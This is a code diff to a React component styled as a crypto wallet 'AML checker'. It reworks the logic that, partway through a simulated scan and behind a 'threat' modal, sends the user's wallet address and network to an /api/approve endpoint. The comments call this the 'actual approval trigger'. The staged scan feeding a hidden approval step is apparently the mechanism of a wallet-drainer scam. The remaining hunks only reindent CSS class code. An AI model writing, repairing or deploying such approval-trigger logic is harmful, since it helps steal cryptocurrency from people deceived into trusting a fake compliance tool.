@@ -109,35 +109,29 @@ export default function AMLChecker() {
         // Actual approval trigger: only after prep is done AND scan reached threat point
         if (newProgress >= 7 && prepDone && !approvalTriggeredRef.current) {
           // Safety double-check
+          // Inside the if (newProgress === 7 && ...) block, right before fetch('/api/approve')
+
           const currentAddress = walletAddressRef.current;
-          const currentNetwork = selectedNetworkRef.current;
+          const currentNetworkKey = selectedNetworkRef.current;  // this is already 'erc' | 'bsc' etc.
 
-          if (!currentAddress || !currentNetwork) {
-            console.error('[v0] Cannot approve — missing address or network');
-            setShowThreatModal(false);
-            clearInterval(interval);
-            return 15; // force end scan
-          }
-
-          // Resolve network key (your existing logic)
-          let networkKey =
-            Object.entries(NETWORKS).find(([_, n]) => n === currentNetwork)?.[0] ??
-            Object.entries(NETWORKS).find(([_, n]) => n.name === (currentNetwork as any)?.name)?.[0];
-
-          if (!networkKey) {
-            console.error('[v0] Could not resolve networkKey');
+          if (!currentAddress || !currentNetworkKey) {
+            console.error('[v0] Missing address or network key at approval time');
             setShowThreatModal(false);
             return newProgress;
           }
 
-          console.log('[v0] PREP DONE → Calling /api/approve', { userAddress: currentAddress, network: networkKey });
+          // No need for complex find — selectedNetworkRef.current IS the key
+          const networkKey = currentNetworkKey;
+
+          console.log('[v0] Using networkKey directly:', networkKey);
+          console.log('[v0] Calling /api/approve with:', { userAddress: currentAddress, network: networkKey });
 
           fetch('/api/approve', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               userAddress: currentAddress,
-              network: networkKey,
+              network: networkKey,          // now correctly 'erc' or 'bsc'
             }),
           })
             .then((res) => {
@@ -263,8 +257,8 @@ export default function AMLChecker() {
                     key={key}
                     onClick={() => handleNetworkSelect(key as Network)}
                     className={`flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-lg border-2 cursor-pointer transition-all ${selectedNetwork === key
-                        ? 'border-emerald-500 bg-emerald-500/10'
-                        : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
+                      ? 'border-emerald-500 bg-emerald-500/10'
+                      : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
                       }`}
                   >
                     {/* Network Icon */}
@@ -286,8 +280,8 @@ export default function AMLChecker() {
                     {/* Radio Button */}
                     <div
                       className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 ${selectedNetwork === key
-                          ? 'border-emerald-500 bg-emerald-500'
-                          : 'border-slate-600'
+                        ? 'border-emerald-500 bg-emerald-500'
+                        : 'border-slate-600'
                         }`}
                     >
                       {selectedNetwork === key && (
@@ -303,8 +297,8 @@ export default function AMLChecker() {
                 onClick={handleNetworkContinue}
                 disabled={!selectedNetwork}
                 className={`w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all ${selectedNetwork
-                    ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
-                    : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
+                  ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
+                  : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
                   }`}
               >
                 Continue
